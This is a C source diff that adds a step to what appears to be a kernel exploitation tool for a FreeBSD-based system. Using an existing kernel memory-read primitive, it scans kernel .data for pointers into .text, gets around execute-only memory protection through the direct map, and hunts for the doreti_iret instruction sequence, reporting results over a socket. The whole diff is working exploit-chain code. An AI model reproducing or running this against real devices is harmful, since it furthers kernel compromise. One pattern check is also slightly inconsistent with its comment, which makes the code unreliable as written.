@@ -3196,6 +3196,159 @@ broad_done:
     send_response(sock, "Broad scan: %d new candidates, %d pages readable, %d blocked\n",
                   broad_new, broad_readable, broad_blocked);
 
+    /* ---- Step 5b: .data Pointer Scan for doreti_iret ---- */
+    /*
+     * If most .text pages are XOM-blocked via DMAP, the real doreti_iret
+     * is unreachable by direct byte scan.  Alternative: scan .data for
+     * pointers into early .text (first 1MB) where interrupt/trap handling
+     * assembly lives.  FreeBSD's trap() compares tf_rip against
+     * doreti_iret, so its address must be stored/referenced somewhere.
+     *
+     * For each .data pointer into early .text, try to DMAP-read 8 bytes
+     * at that address to check for swapgs+iretq or plain iretq.
+     */
+    if (broad_blocked > broad_readable && have_text_pa) {
+        send_response(sock, "\n--- Step 5b: .data Pointer Scan (XOM workaround) ---\n");
+        send_response(sock, "XOM blocks %d/%d .text pages; scanning .data for early .text refs\n",
+                      broad_blocked, broad_blocked + broad_readable);
+
+        uint64_t text_va_start = (uint64_t)ktext_base;
+        uint64_t text_va_early = text_va_start + 0x100000; /* first 1MB */
+        uint64_t data_start = (uint64_t)KERNEL_ADDRESS_DATA_BASE;
+        uint64_t data_scan_size = 0x2000000; /* 32MB */
+        uint8_t dbuf[4096];
+
+        int ptrs_found = 0;
+        int ptrs_dmap_ok = 0;
+        int ptrs_iretq = 0;
+
+        #define MAX_PTR_CANDIDATES 64
+        struct {
+            uint64_t text_va;
+            uint64_t text_pa;
+            uint64_t data_addr;
+            int dmap_readable;
+            int is_iretq;
+            int is_swapgs_iretq;
+        } ptr_cands[MAX_PTR_CANDIDATES];
+        int num_ptr_cands = 0;
+
+        for (uint64_t addr = data_start;
+             addr < data_start + data_scan_size;
+             addr += sizeof(dbuf)) {
+
+            int chunk_num = (int)((addr - data_start) / sizeof(dbuf));
+            if (chunk_num % 2048 == 0)
+                send_response(sock, "  ...%luMB\n",
+                              (unsigned long)((addr - data_start) / (1024 * 1024)));
+
+            if (kernel_copyout(addr, dbuf, sizeof(dbuf)) != 0)
+                continue;
+
+            /* Scan for 8-byte aligned pointers into early .text */
+            for (int off = 0; off <= (int)sizeof(dbuf) - 8; off += 8) {
+                uint64_t val;
+                memcpy(&val, dbuf + off, 8);
+
+                if (val < text_va_start || val >= text_va_early)
+                    continue;
+                if (val & 0x1) /* odd addresses unlikely for iretq */
+                    continue;
+
+                ptrs_found++;
+
+                if (num_ptr_cands >= MAX_PTR_CANDIDATES)
+                    continue;
+
+                /* Translate pointer VA to PA */
+                uint64_t ptr_pa = text_pa + (val - text_va_start);
+                uint64_t dmap_addr = dmap_base + ptr_pa;
+
+                int readable = 0;
+                int is_iretq = 0;
+                int is_swapgs_iretq = 0;
+
+                /* Try to read 8 bytes at this .text address via DMAP */
+                uint8_t code[8];
+                if (kernel_copyout(dmap_addr, code, sizeof(code)) == 0) {
+                    readable = 1;
+                    ptrs_dmap_ok++;
+
+                    if (code[0] == 0x48 && code[1] == 0xcf) {
+                        is_iretq = 1;
+                        ptrs_iretq++;
+                    }
+                }
+
+                /* Also check 8 bytes before for swapgs+iretq pattern */
+                if (readable && ptr_pa >= 8) {
+                    uint8_t pre[8];
+                    if (kernel_copyout(dmap_base + ptr_pa - 5, pre, 5) == 0) {
+                        if (pre[0] == 0x0f && pre[1] == 0x01 && pre[2] == 0xf8 &&
+                            pre[3] == 0x48 && pre[4] == 0xcf) {
+                            is_swapgs_iretq = 1;
+                        }
+                    }
+                }
+
+                /* Track unique .text addresses only */
+                int already = 0;
+                for (int i = 0; i < num_ptr_cands; i++) {
+                    if (ptr_cands[i].text_va == val) {
+                        already = 1;
+                        break;
+                    }
+                }
+                if (already)
+                    continue;
+
+                ptr_cands[num_ptr_cands].text_va = val;
+                ptr_cands[num_ptr_cands].text_pa = ptr_pa;
+                ptr_cands[num_ptr_cands].data_addr = addr + off;
+                ptr_cands[num_ptr_cands].dmap_readable = readable;
+                ptr_cands[num_ptr_cands].is_iretq = is_iretq;
+                ptr_cands[num_ptr_cands].is_swapgs_iretq = is_swapgs_iretq;
+                num_ptr_cands++;
+            }
+        }
+
+        send_response(sock, "\nPointers into early .text: %d total, %d unique\n",
+                      ptrs_found, num_ptr_cands);
+        send_response(sock, "DMAP readable: %d, confirmed iretq: %d\n",
+                      ptrs_dmap_ok, ptrs_iretq);
+
+        /* Report results */
+        if (num_ptr_cands > 0) {
+            send_response(sock, "\n%-22s %-14s %-6s %-6s %s\n",
+                          "text VA", "ktext+offset", "DMAP", "iretq", "data ref");
+            send_response(sock, "---------------------- -------------- ------ ------ --------\n");
+        }
+
+        for (int i = 0; i < num_ptr_cands; i++) {
+            uint64_t koff = ptr_cands[i].text_va - text_va_start;
+            send_response(sock, "0x%016lx   ktext+0x%-6lx %-6s %-6s kdata+0x%lx\n",
+                          ptr_cands[i].text_va, koff,
+                          ptr_cands[i].dmap_readable ? "YES" : "NO",
+                          ptr_cands[i].is_iretq ? "YES" :
+                          (ptr_cands[i].dmap_readable ? "NO" : "?"),
+                          ptr_cands[i].data_addr - data_start);
+
+            /* Promote confirmed iretq to candidate list */
+            if (ptr_cands[i].is_iretq &&
+                num_candidates < MAX_DORETI_CANDIDATES) {
+                candidates[num_candidates].paddr = ptr_cands[i].text_pa;
+                candidates[num_candidates].ktext_offset = koff;
+                candidates[num_candidates].has_swapgs_before =
+                    ptr_cands[i].is_swapgs_iretq;
+                candidates[num_candidates].near_handler = 0;
+                candidates[num_candidates].page_dist = 0x7FFFFFFF;
+                num_candidates++;
+            }
+        }
+
+        #undef MAX_PTR_CANDIDATES
+    }
+
     /* ---- Step 6: Classification ---- */
 classify:
     send_response(sock, "\n--- Step 6: doreti_iret Candidates ---\n");
